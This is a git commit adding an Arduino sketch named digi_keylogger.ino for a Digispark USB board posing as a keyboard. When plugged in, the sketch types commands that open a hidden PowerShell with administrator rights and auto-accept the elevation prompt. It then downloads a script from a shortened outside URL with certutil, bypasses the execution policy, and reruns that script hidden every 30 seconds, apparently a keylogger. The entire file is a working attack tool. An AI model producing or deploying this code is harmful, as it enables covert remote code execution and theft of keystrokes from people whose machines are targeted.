10210a907baef4f5a9545e30195ec60740cd29db
chithu162 <59361657+chithu162@users.noreply.github.com>
2019-12-30 16:36:15 +0530

    Add files via upload

---
+++ digi_keylogger.ino
@@ -0,0 +1,27 @@
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell -windowstyle hidden Start-Process powershell -Verb runAs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(" certutil -urlcache -split -f 'http://bit.do/digiscript'  $env:temp/script.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("Set-ExecutionPolicy Bypass");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  while (true) {
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
+  DigiKeyboard.delay(750);
+  DigiKeyboard.print("powershell.exe -windowstyle hidden -File $env:temp/script.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(30000);
+  }
+}
